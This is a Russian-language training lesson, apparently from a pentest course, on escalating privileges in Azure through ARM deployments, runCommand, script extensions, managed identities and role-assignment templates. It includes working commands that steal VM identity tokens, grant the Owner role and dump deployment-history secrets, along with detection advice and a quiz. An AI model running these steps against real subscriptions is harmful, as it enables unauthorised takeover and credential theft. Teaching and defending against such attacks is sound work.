---
id: cloud-azure-arm
title: "ARM-шаблоны и deployments: PassRole по-azure'овски"
category: cloud
parent: cloud-azure-deep
difficulty: hard
order: 4
tags: [cloud, azure, arm, deployments, bicep, privesc, runcommand, managed-identity]
prerequisites: [cloud-azure-deep, cloud-azure-iam]
useful_for:
  - "Эскалация через развёртывания Azure"
  - "Атаки на IaC (ARM/Bicep)"
  - "Понимание модели прав ARM"
estimated_minutes: 55
summary: "Как ARM-развёртывания и Bicep становятся вектором эскалации: назначение ролей, runCommand на VM, custom script extensions, управляемые идентичности и чтение истории deployments ради секретов."
---

## Зачем этот урок

Azure Resource Manager (ARM) — это управляющая плоскость Azure: все ресурсы создаются и меняются через ARM-шаблоны или REST-вызовы. Для атакующего ARM интересен тем, что развёртывание исполняется **от имени вашей идентичности**, но может создавать ресурсы, которые действуют **от имени других** — managed identities, расширения VM, назначения ролей. Это аналог AWS `PassRole`: право на развёртывание превращается в чужую роль. Плюс история развёртываний часто содержит секреты (параметры, строки подключения), а `runCommand` на VM даёт RCE. Этот урок — про то, как читать ARM-права и превращать их в код и привилегии.

## Как устроен ARM

Иерархия: Management Group → Subscription → Resource Group → Resources. Развёртывание (deployment) бывает на уровне resource group, subscription, management group или tenant.

Ключевые сущности и права:

- **`Microsoft.Resources/deployments/write`** — создать развёртывание.
- **`Microsoft.Authorization/roleAssignments/write`** — назначить роль (входит в `Owner` и `User Access Administrator`).
- **`Microsoft.Compute/virtualMachines/runCommand/action`** — выполнить команду на VM.
- **`Microsoft.Compute/virtualMachines/extensions/write`** — поставить расширение (Custom Script Extension) → RCE.
- **`Microsoft.ManagedIdentity/userAssignedIdentities/*`** — создавать/использовать user-assigned MI.
- **`Microsoft.Web/sites/publishxml/action`** — получить publish profile (креды деплоя).
- **`Microsoft.Resources/deployments/read`** — читать историю (секреты в параметрах).

ARM-шаблон — JSON (или Bicep, компилируемый в JSON) с `$schema`, `resources`, `parameters`, `outputs`. Развёртывание можно запускать с `--parameters` (значения часто секретные) и с `mode: Incremental/Complete`.

## Инструменты и команды

Разведка:

```bash
# Что я могу
az rest --method get --url "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/permissions?api-version=2022-04-01"

# Роли и назначения
az role assignment list --all -o table
az role definition list --name Owner --query '[].permissions'

# Ресурсы в группе
az resource list -g myrg -o table
```

Развёртывания и история:

```bash
az deployment group list -g myrg -o table
az deployment group show -g myrg -n mydeploy --query 'properties.parameters'
# Параметры часто содержат пароли/строки подключения

az deployment sub create --location westeurope --template-file main.bicep
az deployment group create -g myrg --template-file main.json --parameters @params.json
```

RCE на VM через runCommand:

```bash
az vm run-command invoke -g myrg -n myvm --command-id RunShellScript \
  --scripts "id; curl -s http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01 -H Metadata:true"
```

Custom Script Extension:

```bash
az vm extension set -g myrg --vm-name myvm --name customScript \
  --publisher Microsoft.Azure.Extensions --settings '{"commandToExecute":"id"}'
```

## Разобранный пример: от Contributor к Owner

Сценарий: у вашей идентичности роль `Contributor` на подписке. `Contributor` не даёт `roleAssignments/write`, поэтому напрямую выдать себе Owner нельзя. Но есть обходы.

Шаг 1 — проверяем права на действия:

```bash
az rest --method get --url "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.Authorization/permissions?api-version=2022-04-01" \
  --query 'value[].actions[]' | grep -iE 'runCommand|extensions|managedIdentities|roleAssignments'
# Microsoft.Compute/virtualMachines/runCommand/action
# Microsoft.Compute/virtualMachines/extensions/write
# Microsoft.ManagedIdentity/userAssignedIdentities/*
```

Шаг 2 — RCE на VM. `Contributor` может выполнить `runCommand` на VM. Команда исполняется от `SYSTEM` (Windows) или root (Linux). Забираем MI-токен VM:

```bash
az vm run-command invoke -g myrg -n prod-vm --command-id RunShellScript \
  --scripts 'curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/&api-version=2018-02-01"'
```

Токен вернётся в выводе. Если у VM системная MI с ролью `Owner` на подписке — вы фактически Owner.

Шаг 3 — если MI нет, создаём **user-assigned MI** и назначаем ей роли (если есть `roleAssignments/write` хотя бы на каком-то scope) либо привязываем к ресурсу. `Contributor` может создать MI, но не назначить роль; `User Access Administrator` — может.

Шаг 4 — развёртывание с назначением роли. Если у вас есть `Microsoft.Authorization/roleAssignments/write`, ARM-шаблон может назначить роль:

```json
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [{
    "type": "Microsoft.Authorization/roleAssignments",
    "apiVersion": "2022-04-01",
    "name": "[guid(resourceGroup().id)]",
    "properties": {
      "roleDefinitionId": "[subscriptionResourceId('Microsoft.Authorization/roleDefinitions','8e3af657-a8ff-443c-a75c-2fe8c4bcb635')]",
      "principalId": "<your-object-id>"
    }
  }]
}
```

`8e3af657-...` — встроенная роль **Owner**. Развёртывание даёт вам Owner.

Шаг 5 — читаем историю развёртываний на предмет секретов:

```bash
for d in $(az deployment group list -g myrg --query '[].name' -o tsv); do
  az deployment group show -g myrg -n "$d" --query 'properties.parameters' 2>/dev/null
done
```

Параметры часто содержат `adminPassword`, `sqlConnectionString`, `apiKey` — прямой путь к данным.

## Варианты атак и обходы

- **`Contributor` + runCommand.** Не требует `roleAssignments/write`: RCE на VM даёт её MI и доступ к её данным.
- **`Contributor` + extensions.** Custom Script Extension — тот же RCE, но другой API.
- **`User Access Administrator`.** Позволяет назначить себе любую роль, включая Owner.
- **`Managed Identity Contributor`.** Создание/привязка MI к ресурсу, который вы контролируете.
- **`Microsoft.Web/sites/publishxml/action`.** Утёкший publish profile → деплой кода в App Service.
- **`Microsoft.KeyVault/vaults/...` в шаблоне.** Развёртывание может выдать вашему principal доступ к Key Vault.
- **Logic Apps / Automation Accounts.** Их `listCallbackUrl` и runbooks дают выполнение кода.
- **Nested templates и `outputs`.** Вложенные шаблоны и выводы могут раскрывать данные.
- **Bicep-мисконфиги.** `targetScope`, передача секретов через параметры без secure-типа.

## Частые ошибки и подводные камни

- **Считать `Contributor` «безопасной» ролью.** Он даёт RCE на VM и доступ к секретам развёртываний.
- **Путать `Contributor` и `Owner`.** Первый не может назначать роли; второй — может.
- **Забывать про `Microsoft.Authorization/roleAssignments/write`.** Проверяйте его отдельно — оно решает всё.
- **Не проверять MI у VM.** Именно MI даёт переход к подписке.
- **Игнорировать историю deployments.** Там лежат параметры с секретами.
- **Ошибка с scope.** Развёртывание на уровне resource group не может назначить роль на подписку.
- **Destructive-развёртывание.** `mode: Complete` удаляет ресурсы, которых нет в шаблоне — согласуйте.

## Защита и детект

- **Не выдавайте `Contributor` широко.** Разделяйте роли; используйте custom roles без `runCommand`/`extensions`.
- **Ограничьте `roleAssignments/write`.** Только `User Access Administrator` в исключительных случаях.
- **Запрещайте runCommand/extensions** через Azure Policy для продакшн-VM.
- **Секреты — в Key Vault references**, не в параметрах шаблонов.
- **Детект.** Activity Log: `Microsoft.Compute/virtualMachines/runCommand/action`, `.../extensions/write`, `Microsoft.Authorization/roleAssignments/write`, `Microsoft.Resources/deployments/write`. Defender for Resource Manager флагует подозрительные операции. Алерты на runCommand с необычных principal, на назначение Owner, на развёртывания с MI.
- **Azure Policy** на запрет назначения Owner, на обязательный secure-параметр.

## Bicep, Terraform и другие IaC в Azure

ARM-шаблоны — не единственный IaC в Azure:

- **Bicep** — DSL, компилируемый в ARM JSON (`bicep build main.bicep`). Те же права и тот же эффект; ошибки в `targetScope` и передача секретов через параметры — типовые.
- **Terraform с azurerm-провайдером** — исполняется от имени service principal (или MI). Если state-файл лежит в Storage account с утёкшим SAS (`cloud-azure-storage-sas`), вы получите все креды и ресурсы (`cloud-terraform`).
- **Azure DevOps pipelines** — задачи развёртывания с service connections; компромисс пайплайна даёт его права (`cloud-cicd-jenkins`).

Общее для всех: **развёртывание исполняется от имени идентичности с правами на ARM**, а создаваемые ресурсы могут иметь собственные MI. Поэтому любой IaC-пайплайн — это «PassRole»: если вы можете изменить шаблон или параметры, вы можете создать ресурс, который действует от имени более привилегированной идентичности. Ищите state-файлы, service connections и параметры с секретами — это самый быстрый путь к кредам.

## Практический чек-лист ARM-эскалации

1. Выгрузите свои разрешения (`Microsoft.Authorization/permissions`).
2. Ищите `roleAssignments/write` — если есть, назначайте Owner напрямую.
3. Иначе ищите `runCommand/action` и `extensions/write` — RCE на VM и её MI.
4. Проверьте `managedIdentities/*` — можете ли привязать MI к своему ресурсу.
5. Проверьте `sites/publishxml/action`, `automationAccounts`, `logicApps` — пути к выполнению кода.
6. Прочитайте историю deployments на секреты в параметрах.
7. Проверьте VM и ACI на наличие системных MI и их роли.
8. Оцените, есть ли Azure Policy, блокирующая runCommand/roleAssignments.

Этот порядок отражает «дешёвые» пути (RCE и история) и «дорогие» (назначение ролей), и помогает быстро найти реальную эскалацию.

## Итоговая модель угроз ARM

Соберём картину целиком. ARM-эскалация сводится к трём «семействам» путей: (1) **назначение ролей** — если есть `roleAssignments/write`, вы выдаёте себе Owner; (2) **выполнение кода** — `runCommand`/`extensions`/`publishxml`/Logic Apps/Automation дают исполнение на ресурсе, а значит его managed identity; (3) **чтение секретов** — история развёртываний, Key Vault references, параметры шаблонов. Комбинация этих путей с `iam:PassRole`-аналогом (создание ресурса с чужой MI) покрывает почти все реальные сценарии. Для защиты это означает: ограничивать не только `Owner`, но и `Contributor` (из-за runCommand), запрещать назначение ролей, держать секреты вне параметров и мониторить deployments. Для пентеста — проверять все три семейства, начиная с самого дешёвого (RCE на VM и история развёртываний).

## Что дальше / решение

ARM — это PassRole Azure. Если у вас `Contributor` — ищите VM и выполняйте `runCommand`/extensions, чтобы добраться до её MI; если MI привилегированная, вы у цели. Если есть `roleAssignments/write` — назначьте Owner напрямую. Всегда читайте историю развёртываний: там секреты. Если у вас только `Reader` — ищите утёкшие publish profiles и MI-токены в других сервисах. Стройте цепочку: `Contributor → runCommand → VM MI → subscription access`. Записывайте каждый шаг и найденные секреты.

## Квиз

```quiz
- question: "Почему Contributor в Azure опаснее, чем кажется?"
  options:
    - "Он позволяет runCommand/extensions на VM и чтение истории развёртываний"
    - "Он даёт доступ к биллингу"
    - "Он читает секреты Key Vault"
    - "Он назначает роли"
  answer: 0
  explanation: "Contributor не назначает роли, но даёт RCE на VM и доступ к параметрам deployments."
- question: "Какое право позволяет назначить себе Owner?"
  options:
    - "Microsoft.Authorization/roleAssignments/write"
    - "Microsoft.Compute/virtualMachines/runCommand/action"
    - "Microsoft.Web/sites/read"
    - "Microsoft.Storage/storageAccounts/read"
  answer: 0
  explanation: "roleAssignments/write входит в Owner и User Access Administrator."
- question: "Что даёт runCommand на VM?"
  options:
    - "Выполнение команд от SYSTEM/root и доступ к MI VM"
    - "Только чтение логов"
    - "Только перезагрузку"
    - "Смену тарифа"
  answer: 0
  explanation: "runCommand исполняет команды с высокими правами и позволяет забрать MI-токен."
- question: "Где в ARM часто лежат секреты?"
  options:
    - "В параметрах развёртываний (deployment history)"
    - "В тегах ресурсов"
    - "В именах ресурсов"
    - "В регионах"
  answer: 0
  explanation: "Параметры deployments часто содержат пароли и строки подключения."
```

## Где пригодится

- **Пентест Azure:** эскалация через ARM и runCommand.
- **Red team:** PassRole-аналог, захват MI.
- **Bug bounty:** Azure-подписки с широкими ролями.
- **Blue team:** аудит ролей и детект runCommand/roleAssignments.
